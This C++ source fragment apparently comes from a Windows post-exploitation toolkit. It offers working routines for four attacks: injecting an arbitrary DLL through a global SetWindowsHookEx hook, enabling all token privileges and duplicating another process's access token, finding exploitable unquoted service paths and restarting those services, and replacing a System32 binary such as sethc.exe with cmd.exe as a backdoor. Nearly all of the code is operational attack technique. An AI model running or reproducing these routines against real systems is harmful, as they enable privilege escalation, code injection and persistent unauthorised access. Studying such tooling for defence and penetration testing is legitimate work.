// NOTE: Your DLL must export GetHookType() and HookProc().
// NOTE: More about the DLL at github.com/ivan-sincek/invoker#make-a-dll-with-a-hook-procedure.
void HookJob(hook* info) {
	info->active = true;
	HMODULE hLib = LoadLibraryA(info->file.c_str());
	if (hLib == NULL) {
		printf("Cannot load the \"%s\"\n", info->file.c_str());
	}
	else {
		FARPROC GetHookType = (FARPROC)GetProcAddress(hLib, "GetHookType");
		if (GetHookType == NULL) {
			printf("Cannot get the address of GetHookType()\n");
		}
		else {
			HOOKPROC HookProc = (HOOKPROC)GetProcAddress(hLib, "HookProc");
			if (HookProc == NULL) {
				printf("Cannot get the address of HookProc()\n");
			}
			else {
				HHOOK hHook = SetWindowsHookExA(GetHookType(), HookProc, hLib, 0);
				if (hHook == NULL) {
					printf("Cannot install the hook procedure\n");
				}
				else {
					printf("Hook procedure has been installed successfully\n");
					MSG msg = { };
					while (GetMessageA(&msg, NULL, 0, 0)) {
						TranslateMessage(&msg);
						DispatchMessageA(&msg);
					}
					UnhookWindowsHookEx(hHook);
					CloseHandle(hHook);
				}
			}
		}
		FreeLibrary(hLib);
	}
	info->active = false;
}

bool CreateHookThread(hook* info) {
	bool success = false;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HookJob, info, 0, NULL);
	if (hThread == NULL) {
		printf("Cannot create the hook thread\n");
	}
	else {
		info->tid = GetThreadId(hThread);
		success = true;
		// NOTE: Just a little delay to prevent the race condition on displaying the output message from the hook thread.
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
	}
	return success;
}

bool RemoveHookThread(hook* info) {
	bool success = false;
	if (PostThreadMessageA(info->tid, WM_QUIT, NULL, NULL) == 0) {
		printf("Cannot send the WM_QUIT message to the hook thread\n");
	}
	else {
		success = true;
		printf("Hook procedure has been uninstalled successfully\n");
	}
	return success;
}

// --------------------------------------- SECTION: TOKENS

void EnableAccessTokenPrivs() {
	HANDLE hProcess = GetCurrentProcess();
	HANDLE hToken = NULL;
	if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), &hToken) == 0) {
		printf("Cannot get the token handle\n");
	}
	else {
		struct privs {
			const char* privilege;
			bool set;
		};
		privs array[] = {
			{ "SeAssignPrimaryTokenPrivilege",             false },
			{ "SeAuditPrivilege",                          false },
			{ "SeBackupPrivilege",                         false },
			{ "SeChangeNotifyPrivilege",                   false },
			{ "SeCreateGlobalPrivilege",                   false },
			{ "SeCreatePagefilePrivilege",                 false },
			{ "SeCreatePermanentPrivilege",                false },
			{ "SeCreateSymbolicLinkPrivilege",             false },
			{ "SeCreateTokenPrivilege",                    false },
			{ "SeDebugPrivilege",                          false },
			{ "SeDelegateSessionUserImpersonatePrivilege", false },
			{ "SeEnableDelegationPrivilege",               false },
			{ "SeImpersonatePrivilege",                    false },
			{ "SeIncreaseBasePriorityPrivilege",           false },
			{ "SeIncreaseQuotaPrivilege",                  false },
			{ "SeIncreaseWorkingSetPrivilege",             false },
			{ "SeLoadDriverPrivilege",                     false },
			{ "SeLockMemoryPrivilege",                     false },
			{ "SeMachineAccountPrivilege",                 false },
			{ "SeManageVolumePrivilege",                   false },
			{ "SeProfileSingleProcessPrivilege",           false },
			{ "SeRelabelPrivilege",                        false },
			{ "SeRemoteShutdownPrivilege",                 false },
			{ "SeRestorePrivilege",                        false },
			{ "SeSecurityPrivilege",                       false },
			{ "SeShutdownPrivilege",                       false },
			{ "SeSyncAgentPrivilege",                      false },
			{ "SeSystemEnvironmentPrivilege",              false },
			{ "SeSystemProfilePrivilege",                  false },
			{ "SeSystemtimePrivilege",                     false },
			{ "SeTakeOwnershipPrivilege",                  false },
			{ "SeTcbPrivilege",                            false },
			{ "SeTimeZonePrivilege",                       false },
			{ "SeTrustedCredManAccessPrivilege",           false },
			{ "SeUndockPrivilege",                         false },
			{ "SeUnsolicitedInputPrivilege",               false }
		};
		int size = sizeof(array) / sizeof(array[0]);
		for (int i = 0; i < size - 1; i++) {
			TOKEN_PRIVILEGES tp = { };
			if (LookupPrivilegeValueA(NULL, array[i].privilege, &tp.Privileges[0].Luid) != 0) {
				tp.PrivilegeCount = 1;
				tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
				if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) != 0 && GetLastError() == ERROR_SUCCESS) {
					array[i].set = true;
				}
			}
		}
		printf("############################ PRIVILEGES ENABLED ############################\n");
		for (int i = 0; i < size - 1; i++) {
			if (array[i].set) {
				printf("# %-*.*s #\n", 72, 72, array[i].privilege);
			}
		}
		printf("############################################################################\n");
		printf("\n");
		printf("########################## PRIVILEGES NOT ENABLED ##########################\n");
		for (int i = 0; i < size - 1; i++) {
			if (!array[i].set) {
				printf("# %-*.*s #\n", 72, 72, array[i].privilege);
			}
		}
		printf("############################################################################\n");
		CloseHandle(hToken);
	}
}

HANDLE DuplicateAccessToken(DWORD pid) {
	HANDLE dToken = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (hProcess == NULL) {
		printf("Cannot get the process handle\n");
	}
	else {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY), &hToken) == 0) {
			printf("Cannot get the token handle\n");
		}
		else {
			if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken) == 0) {
				printf("Cannot duplicate the token\n");
			}
			else {
				printf("Token has been duplicated successfully\n");
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}
	return dToken;
}

// --------------------------------------- SECTION: SERVICES

// NOTE: This method will only search for unquoted service paths outside of \Windows\ directory.
// NOTE: Services must be able to start either automatically or manually and either be running or stopped.
std::string GetUnquotedServiceName() {
	std::string name = "";
	SC_HANDLE hManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
	if (hManager == NULL) {
		printf("Cannot get the service control manager handle\n");
	}
	else {
		DWORD size = 0, count = 0, resume = 0;
		if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &size, &count, 0) != 0) {
			printf("Cannot get the size of additional process memory\n");
		}
		else {
			HANDLE hHeap = GetProcessHeap();
			if (hHeap == NULL) {
				printf("Cannot get the process heap handle\n");
			}
			else {
				LPENUM_SERVICE_STATUSA buffer = (LPENUM_SERVICE_STATUSA)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
				if (buffer == NULL) {
					printf("Cannot allocate the additional process memory\n");
				}
				else {
					if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, buffer, size, &size, &count, &resume) == 0) {
						printf("Cannot enumerate the services\n");
					}
					else {
						LPENUM_SERVICE_STATUSA services = buffer;
						bool exists = false;
						for (DWORD i = 0; i < count; i++) {
							SC_HANDLE hService = OpenServiceA(hManager, services->lpServiceName, SERVICE_QUERY_CONFIG);
							if (hService != NULL) {
								if (QueryServiceConfigA(hService, NULL, 0, &size) == 0) {
									LPQUERY_SERVICE_CONFIGA config = (LPQUERY_SERVICE_CONFIGA)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
									if (config != NULL) {
										if (QueryServiceConfigA(hService, config, size, &size) != 0) {
											std::string path = StrToLower(config->lpBinaryPathName);
											if (path.find("\"") == std::string::npos && path.find(":\\windows\\") == std::string::npos && (config->dwStartType == SERVICE_AUTO_START || config->dwStartType == SERVICE_DEMAND_START) && (services->ServiceStatus.dwCurrentState == SERVICE_RUNNING || services->ServiceStatus.dwCurrentState == SERVICE_STOPPED)) {
												exists = true;
												printf("Name        : %s\n", services->lpServiceName);
												printf("DisplayName : %s\n", services->lpDisplayName);
												printf("PathName    : %s\n", config->lpBinaryPathName);
												printf("StartName   : %s\n", config->lpServiceStartName);
												printf("StartMode   : %s\n", config->dwStartType == SERVICE_AUTO_START ? "Auto" : "Manual");
												printf("State       : %s\n", services->ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped");
												printf("\n");
											}
										}
										HeapFree(hHeap, 0, config);
									}
								}
								CloseServiceHandle(hService);
							}
							services++;
						}
						if (!exists) {
							printf("No unquoted service paths were found\n");
						}
						else {
							std::string svc = Input("Enter service name");
							if (svc.length() < 1) {
								printf("\n");
								printf("Service name is rquired\n");
							}
							else {
								services = buffer;
								exists = false;
								for (DWORD i = 0; i < count; i++) {
									if (services->lpServiceName == svc) {
										exists = true;
										name = services->lpServiceName;
										break;
									}
									services++;
								}
								if (!exists) {
									printf("\n");
									printf("Service does not exists\n");
								}
							}
						}
					}
					HeapFree(hHeap, 0, buffer);
				}
				CloseHandle(hHeap);
			}
		}
		CloseServiceHandle(hManager);
	}
	return name;
}

bool ManageService(std::string name, int task) {
	bool success = false;
	SC_HANDLE hManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
	if (hManager == NULL) {
		printf("Cannot get the service control manager handle\n");
	}
	else {
		SC_HANDLE hService = OpenServiceA(hManager, name.c_str(), (SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP));
		if (hService == NULL) {
			printf("Cannot get the service handle\n");
		}
		else {
			SERVICE_STATUS info = { };
			if (QueryServiceStatus(hService, &info) == 0) {
				printf("Cannot get the service information\n");
			}
			else {
				if (task == SVC_STOP || task == SVC_RESTART) {
					if (info.dwCurrentState == SERVICE_STOPPED) {
						success = true;
						printf("Service is not running\n");
					}
					else if (ControlService(hService, SERVICE_CONTROL_STOP, &info) == 0) {
						success = false;
						printf("Cannot stop the service\n");
					}
					else {
						do {
							Sleep(200);
							if (QueryServiceStatus(hService, &info) == 0) {
								success = false;
								printf("Cannot update the service information\n");
								break;
							}
						} while (info.dwCurrentState != SERVICE_STOPPED);
						if (info.dwCurrentState == SERVICE_STOPPED) {
							success = true;
							printf("Service has been stopped successfully\n");
						}
					}
				}
				if (task == SVC_RESTART) {
					printf("\n");
				}
				if (task == SVC_START || task == SVC_RESTART) {
					if (info.dwCurrentState == SERVICE_RUNNING) {
						success = true;
						printf("Service is already running\n");
					}
					else if (StartServiceA(hService, 0, NULL) == 0) {
						success = false;
						printf("Cannot start the service\n");
					}
					else {
						do {
							Sleep(200);
							if (QueryServiceStatus(hService, &info) == 0) {
								success = false;
								printf("Cannot update the service information\n");
								break;
							}
						} while (info.dwCurrentState != SERVICE_RUNNING);
						if (info.dwCurrentState == SERVICE_RUNNING) {
							success = true;
							printf("Service has been started successfully\n");
						}
					}
				}
			}
			CloseServiceHandle(hService);
		}
		CloseServiceHandle(hManager);
	}
	return success;
}

// --------------------------------------- SECTION: MISCELLANEOUS

// NOTE: File should be a \System32\ executable file, e.g. sethc.exe.
// TO DO: Implement a restore method.
bool ReplaceSystem32File(std::string file) {
	bool success = false;
	char* buffer = NULL;
	if (_dupenv_s(&buffer, NULL, "WINDIR") != 0 || buffer == NULL) {
		printf("Cannot resolve the %%WINDIR%% env. variable\n");
	}
	else {
		size_t size = strlen(buffer);
		if (size < 1) {
			printf("%%WINDIR%% env. variable is empty\n");
		}
		else {
			std::string dir = std::string(buffer, size).append("\\System32\\");
			std::string backup = std::string(file.insert(0, dir)).append(".backup");
			std::string cmd = std::string(dir).append("cmd.exe");
			if (CopyFileA(file.c_str(), backup.c_str(), FALSE) == 0) {
				printf("Cannot copy \"%s\" to \"%s\"\n", file.c_str(), backup.c_str());
			}
			else if (CopyFileA(cmd.c_str(), file.c_str(), FALSE) == 0) {
				printf("Cannot copy \"%s\" to \"%s\"\n", cmd.c_str(), file.c_str());
				DeleteFileA(backup.c_str());
			}
			else {
				success = true;
				printf("\"%s\" was successfully copied to \"%s\"\n", cmd.c_str(), file.c_str());
				printf("\n");
				printf("To restore the original file, rename \"%s\" back to \"%s\"\n", backup.c_str(), file.c_str());
			}
		}
		free(buffer);
	}
	return success;
}
